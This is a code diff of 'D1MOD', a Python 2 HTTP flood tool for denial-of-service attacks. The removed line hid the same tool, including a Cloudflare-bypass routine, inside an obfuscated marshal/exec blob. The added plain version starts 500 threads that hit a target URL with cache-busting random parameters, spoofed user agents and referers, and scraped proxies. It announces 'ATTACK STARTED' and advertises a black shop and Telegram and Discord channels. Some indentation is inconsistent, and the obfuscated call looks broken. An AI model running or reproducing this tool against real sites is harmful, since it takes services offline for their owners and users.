@@ -1,2 +1,167 @@
-import marshal
-exec(marshal.loads('20urllib2%0Aimport%20sys%0Aimport%20threading%0Aimport%20random%0Aimport%20re%0A%0A%23global%20params%0Aurl%3D%27%27%0Ahost%3D%27%27%0Aheaders_useragents%3D%5B%5D%0Aheaders_referers%3D%5B%5D%0Arequest_counter%3D0%0Aflag%3D0%0Asafe%3D0%0A%0Adef%20inc_counter%28%29%3A%0A%09global%20request_counter%0A%09request_counter%2B%3D1%0A%0Adef%20set_flag%28val%29%3A%0A%09global%20flag%0A%09flag%3Dval%0A%0Adef%20set_safe%28%29%3A%0A%09global%20safe%0A%09safe%3D1%0A%09%0A%23%20generates%20a%20user%20agent%20array%0Adef%20useragent_list%28%29%3A%0A%09global%20headers_useragents%0A%09headers_useragents.append%28%27Mozilla%2F5.0%20%28X11%3B%20U%3B%20Linux%20x86_64%3B%20en-US%3B%20rv%3A1.9.1.3%29%20Gecko%2F20090913%20Firefox%2F3.5.3%27%29%0A%09headers_useragents.append%28%27Mozilla%2F5.0%20%28Windows%3B%20U%3B%20Windows%20NT%206.1%3B%20en%3B%20rv%3A1.9.1.3%29%20Gecko%2F20090824%20Firefox%2F3.5.3%20%28.NET%20CLR%203.5.30729%29%27%29%0A%09headers_useragents.append%28%27Mozilla%2F5.0%20%28Windows%3B%20U%3B%20Windows%20NT%205.2%3B%20en-US%3B%20rv%3A1.9.1.3%29%20Gecko%2F20090824%20Firefox%2F3.5.3%20%28.NET%20CLR%203.5.30729%29%27%29%0A%09headers_useragents.append%28%27Mozilla%2F5.0%20%28Windows%3B%20U%3B%20Windows%20NT%206.1%3B%20en-US%3B%20rv%3A1.9.1.1%29%20Gecko%2F20090718%20Firefox%2F3.5.1%27%29%0A%09headers_useragents.append%28%27Mozilla%2F5.0%20%28Windows%3B%20U%3B%20Windows%20NT%205.1%3B%20en-US%29%20AppleWebKit%2F532.1%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F4.0.219.6%20Safari%2F532.1%27%29%0A%09headers_useragents.append%28%27Mozilla%2F4.0%20%28compatible%3B%20MSIE%208.0%3B%20Windows%20NT%206.1%3B%20WOW64%3B%20Trident%2F4.0%3B%20SLCC2%3B%20.NET%20CLR%202.0.50727%3B%20InfoPath.2%29%27%29%0A%09headers_useragents.append%28%27Mozilla%2F4.0%20%28compatible%3B%20MSIE%208.0%3B%20Windows%20NT%206.0%3B%20Trident%2F4.0%3B%20SLCC1%3B%20.NET%20CLR%202.0.50727%3B%20.NET%20CLR%201.1.4322%3B%20.NET%20CLR%203.5.30729%3B%20.NET%20CLR%203.0.30729%29%27%29%0A%09headers_useragents.append%28%27Mozilla%2F4.0%20%28compatible%3B%20MSIE%208.0%3B%20Windows%20NT%205.2%3B%20Win64%3B%20x64%3B%20Trident%2F4.0%29%27%29%0A%09headers_useragents.append%28%27Mozilla%2F4.0%20%28compatible%3B%20MSIE%208.0%3B%20Windows%20NT%205.1%3B%20Trident%2F4.0%3B%20SV1%3B%20.NET%20CLR%202.0.50727%3B%20InfoPath.2%29%27%29%0A%09headers_useragents.append%28%27Mozilla%2F5.0%20%28Windows%3B%20U%3B%20MSIE%207.0%3B%20Windows%20NT%206.0%3B%20en-US%29%27%29%0A%09headers_useragents.append%28%27Mozilla%2F4.0%20%28compatible%3B%20MSIE%206.1%3B%20Windows%20XP%29%27%29%0A%09headers_useragents.append%28%27Opera%2F9.80%20%28Windows%20NT%205.2%3B%20U%3B%20ru%29%20Presto%2F2.5.22%20Version%2F10.51%27%29%0A%09return%28headers_useragents%29%0A%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%0Adef%20cloudflare_bypass%28self%2C%20r%29%3A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%0A%20%20%20%20%20%20%20%20body%20%3D%20r.text%0A%20%20%20%20%20%20%20%20scheme%20%3D%20re.search%28r%27%5E%28%5B%5Cw%5D%2A%29%27%2C%20r.url%29.group%281%29%0A%20%20%20%20%20%20%20%20domain%20%3D%20re.search%28r%27%5C%2F%5C%2F%28%5B%5E%5C%2F%5D%2A%29%27%2C%20r.url%29.group%281%29%0A%20%20%20%20%20%20%20%20submit_url%20%3D%20%27%7B%7D%3A%2F%2F%7B%7D%2Fcdn-cgi%2Fl%2Fchk_jschl%27.format%28scheme%2C%20domain%29%0A%20%20%20%20%20%20%20%20jschl_vc%20%3D%20re.search%28r%27name%3D%22jschl_vc%22%20value%3D%22%28%5Cw%2B%29%22%27%2C%20body%29.group%281%29%0A%20%20%20%20%20%20%20%20pas%20%3D%20re.search%28r%27name%3D%22pass%22%20value%3D%22%28.%2B%3F%29%22%27%2C%20body%29.group%281%29%0A%20%20%20%20%20%20%20%20jschl_answer%20%3D%20str%28self.solve_challenge%28body%29%20%2B%20len%28domain%29%29%0A%20%20%20%20%20%20%20%20time.sleep%285%29%0A%20%20%20%20%20%20%20%20return%20%27%7B0%7D%3Fjschl_vc%3D%7B1%7D%26pass%3D%7B2%7D%26jschl_answer%3D%7B3%7D%27.format%28submit_url%2C%20jschl_vc%2C%20pas%2C%20jschl_answer%29%0A%0AONE_BROWSER_QUERYS_LIMIT%20%3D%201500%0A%0AANTI_DDOS_SLEEP_SECS%20%3D%2010000%0A%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%0A%0A%0A%23%20generates%20a%20referer%20array%0Adef%20referer_list%28%29%3A%0A%09global%20headers_referers%0A%09headers_referers.append%28%27http%3A%2F%2Fwww.google.com%2F%3Fq%3D%27%29%0A%09headers_referers.append%28%27http%3A%2F%2Fwww.usatoday.com%2Fsearch%2Fresults%3Fq%3D%27%29%0A%09headers_referers.append%28%27http%3A%2F%2Fengadget.search.aol.com%2Fsearch%3Fq%3D%27%29%0A%09headers_referers.append%28%27http%3A%2F%2F%27%20%2B%20host%20%2B%20%27%2F%27%29%0A%09return%28headers_referers%29%0A%09%0A%23builds%20random%20ascii%20string%0Adef%20buildblock%28size%29%3A%0A%09out_str%20%3D%20%27%27%0A%09for%20i%20in%20range%280%2C%20size%29%3A%0A%09%09a%20%3D%20random.randint%2865%2C%2090%29%0A%09%09out_str%20%2B%3D%20chr%28a%29%0A%09return%28out_str%29%0A%0Adef%20usage%28%29%3A%0A%09print%20%27---------------------------------------------------%27%0A%09print%20%27USAGE%3A%20python2%20D1MOD.py%20%3Curl%3E%27%0A%09print%20%27EXAMPLE%20%3A%20python2%20D1MOD.py%20https%3A%2F%2Fgiv.tr%27%0A%09print%20%271877%20TEAM%20https%3A%2F%2F1877.team%2F%27%0A%09print%20%27---------------------------------------------------%27%0A%0A%09%0A%23http%20request%0Adef%20httpcall%28url%29%3A%0A%09useragent_list%28%29%0A%09referer_list%28%29%0A%09code%3D0%0A%09if%20url.count%28%22%3F%22%29%3E0%3A%0A%09%09param_joiner%3D%22%26%22%0A%09else%3A%0A%09%09param_joiner%3D%22%3F%22%0A%09request%20%3D%20urllib2.Request%28url%20%2B%20param_joiner%20%2B%20buildblock%28random.randint%283%2C10%29%29%20%2B%20%27%3D%27%20%2B%20buildblock%28random.randint%283%2C10%29%29%29%0A%09request.add_header%28%27User-Agent%27%2C%20random.choice%28headers_useragents%29%29%0A%09request.add_header%28%27Cache-Control%27%2C%20%27no-cache%27%29%0A%09request.add_header%28%27Accept-Charset%27%2C%20%27ISO-8859-1%2Cutf-8%3Bq%3D0.7%2C%2A%3Bq%3D0.7%27%29%0A%09request.add_header%28%27Referer%27%2C%20random.choice%28headers_referers%29%20%2B%20buildblock%28random.randint%285%2C10%29%29%29%0A%09request.add_header%28%27Keep-Alive%27%2C%20random.randint%28110%2C120%29%29%0A%09request.add_header%28%27Connection%27%2C%20%27keep-alive%27%29%0A%09request.add_header%28%27Host%27%2Chost%29%0A%09try%3A%0A%09%09%09urllib2.urlopen%28request%29%0A%09except%20urllib2.HTTPError%2C%20e%3A%0A%09%09%09%23print%20e.code%0A%09%09%09set_flag%281%29%0A%09%09%09print%20%27ATTACKED%20BY%20D1MOD1877%27%0A%09%09%09code%3D500%0A%09except%20urllib2.URLError%2C%20e%3A%0A%09%09%09%23print%20e.reason%0A%09%09%09sys.exit%28%29%0A%09else%3A%0A%09%09%09inc_counter%28%29%0A%09%09%09urllib2.urlopen%28request%29%0A%09return%28code%29%09%09%0A%0A%09%0A%23http%20caller%20thread%20%0Aclass%20HTTPThread%28threading.Thread%29%3A%0A%09def%20run%28self%29%3A%0A%09%09try%3A%0A%09%09%09while%20flag%3C2%3A%0A%09%09%09%09code%3Dhttpcall%28url%29%0A%09%09%09%09if%20%28code%3D%3D500%29%20%26%20%28safe%3D%3D1%29%3A%0A%09%09%09%09%09set_flag%282%29%0A%09%09except%20Exception%2C%20ex%3A%0A%09%09%09pass%0A%0A%23%20monitors%20http%20threads%20and%20counts%20requests%0Aclass%20MonitorThread%28threading.Thread%29%3A%0A%09def%20run%28self%29%3A%0A%09%09previous%3Drequest_counter%0A%09%09while%20flag%3D%3D0%3A%0A%09%09%09if%20%28previous%2B100%3Crequest_counter%29%20%26%20%28previous%3C%3Erequest_counter%29%3A%0A%09%09%09%09print%20%22%25d%20D1MOD%20ATTACKING%20STARTED%20%3A%22%20%25%20%28request_counter%29%0A%09%09%09%09previous%3Drequest_counter%0A%09%09if%20flag%3D%3D2%3A%0A%09%09%09print%20%22%5Cn--%20D1MOD%20Attack%20Finished%20--%22%0A%0A%23execute%20%0Aif%20len%28sys.argv%29%20%3C%202%3A%0A%09usage%28%29%0A%09sys.exit%28%29%0Aelse%3A%0A%09if%20sys.argv%5B1%5D%3D%3D%22help%22%3A%0A%09%09usage%28%29%0A%09%09sys.exit%28%29%0A%09else%3A%0A%09%09print%20%22--%20D1MOD%20Attack%20Started%20--%22%0A%09%09if%20len%28sys.argv%29%3D%3D%203%3A%0A%09%09%09if%20sys.argv%5B2%5D%3D%3D%22safe%22%3A%0A%09%09%09%09set_safe%28%29%0A%09%09url%20%3D%20sys.argv%5B1%5D%0A%09%09if%20url.count%28%22%2F%22%29%3D%3D2%3A%0A%09%09%09url%20%3D%20url%20%2B%20%22%2F%22%0A%09%09m%20%3D%20re.search%28%27%28https%3F%5C%3A%2F%2F%29%3F%28%5B%5E%2F%5D%2A%29%2F%3F.%2A%27%2C%20url%29%0A%09%09host%20%3D%20m.group%282%29%0A%09%09for%20i%20in%20range%28500%29%3A%0A%09%09%09t%20%3D%20HTTPThread%28%29%0A%09%09%09t.start%28%29%0A%09%09t%20%3D%20MonitorThread%28%29%0A%09%09t.start%28%29'))
+import urllib2
+import sys
+import threading
+import random
+import re
+
+#global params
+url=''
+host=''
+headers_useragents=[]
+headers_referers=[]
+request_counter=0
+flag=0
+safe=0
+
+def inc_counter():
+	global request_counter
+	request_counter+=1
+
+def set_flag(val):
+	global flag
+	flag=val
+
+def set_safe():
+	global safe
+	safe=1
+	
+# generates a user agent array
+def useragent_list():
+	global headers_useragents
+	headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3')
+	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
+	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
+	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1')
+	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1')
+	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)')
+	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)')
+	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)')
+	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)')
+	headers_useragents.append('Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)')
+	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)')
+	headers_useragents.append('Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51')
+	return(headers_useragents)
+
+
+#genarate proxy
+from lxml.html import fromstring
+import requests
+import traceback
+
+def get_proxies():
+    url = 'https://sslproxies.org/'
+    response = requests.get(url)
+    parser = fromstring(response.text)
+    proxies = set()
+    for i in parser.xpath('//tbody/tr')[:10]:
+        if i.xpath('.//td[7][contains(text(),"yes")]'):
+            proxy = ":".join([i.xpath('.//td[1]/text()')[0], i.xpath('.//td[2]/text()')[0]])
+            proxies.add(proxy)
+    return proxies
+
+
+
+# generates a referer array
+def referer_list():
+	global headers_referers
+	headers_referers.append('http://www.google.com/?q=')
+	headers_referers.append('http://www.usatoday.com/search/results?q=')
+	headers_referers.append('http://engadget.search.aol.com/search?q=')
+	headers_referers.append('http://' + host + '/')
+	return(headers_referers)
+	
+#builds random ascii string
+def buildblock(size):
+	out_str = ''
+	for i in range(0, size):
+		a = random.randint(65, 90)
+		out_str += chr(a)
+	return(out_str)
+
+def usage():
+	print '---------------------------------------------------'
+	print 'USAGE : python2 D1MOD.py <url>'
+  print 'BLACK SHOP : https://d1modshop.ml'
+  print 'TELEGRAM CHANNEL : https://t.me/the_dead_team'
+	print 'DISCORD SERVER : https://discord.gg/hn7epsef4Z'
+	print '---------------------------------------------------'
+
+	
+#http request
+def httpcall(url):
+	useragent_list()
+	referer_list()
+	code=0
+	if url.count("?")>0:
+		param_joiner="&"
+	else:
+		param_joiner="?"
+	request = urllib2.Request(url + param_joiner + buildblock(random.randint(3,10)) + '=' + buildblock(random.randint(3,10)))
+	request.add_header('User-Agent', random.choice(headers_useragents))
+	request.add_header('Cache-Control', 'no-cache')
+	request.add_header('Accept-Charset', 'ISO-8859-1,utf-8;q=0.7,*;q=0.7')
+	request.add_header('Referer', random.choice(headers_referers) + buildblock(random.randint(5,10)))
+	request.add_header('Keep-Alive', random.randint(110,120))
+	request.add_header('Connection', 'keep-alive')
+	request.add_header('Host',host)
+	try:
+			urllib2.urlopen(request)
+	except urllib2.HTTPError, e:
+			#print e.code
+			set_flag(1)
+			print 'Response Code 500'
+			code=500
+	except urllib2.URLError, e:
+			#print e.reason
+			sys.exit()
+	else:
+			inc_counter()
+			urllib2.urlopen(request)
+	return(code)		
+
+	
+#http caller thread 
+class HTTPThread(threading.Thread):
+	def run(self):
+		try:
+			while flag<2:
+				code=httpcall(url)
+				if (code==500) & (safe==1):
+					set_flag(2)
+		except Exception, ex:
+			pass
+
+# monitors http threads and counts requests
+class MonitorThread(threading.Thread):
+	def run(self):
+		previous=request_counter
+		while flag==0:
+			if (previous+100<request_counter) & (previous<>request_counter):
+				print "%d Requests Sent" % (request_counter)
+				previous=request_counter
+		if flag==2:
+			print "\n-- D1MOD Attack FINISHED --"
+
+#execute 
+if len(sys.argv) < 2:
+	usage()
+	sys.exit()
+else:
+	if sys.argv[1]=="help":
+		usage()
+		sys.exit()
+	else:
+		print "-- D1MOD ATTACK STARTED --"
+		if len(sys.argv)== 3:
+			if sys.argv[2]=="safe":
+				set_safe()
+		url = sys.argv[1]
+		if url.count("/")==2:
+			url = url + "/"
+		m = re.search('(https?\://)?([^/]*)/?.*', url)
+		host = m.group(2)
+		for i in range(500):
+			t = HTTPThread()
+			t.start()
+		t = MonitorThread()
+		t.start()
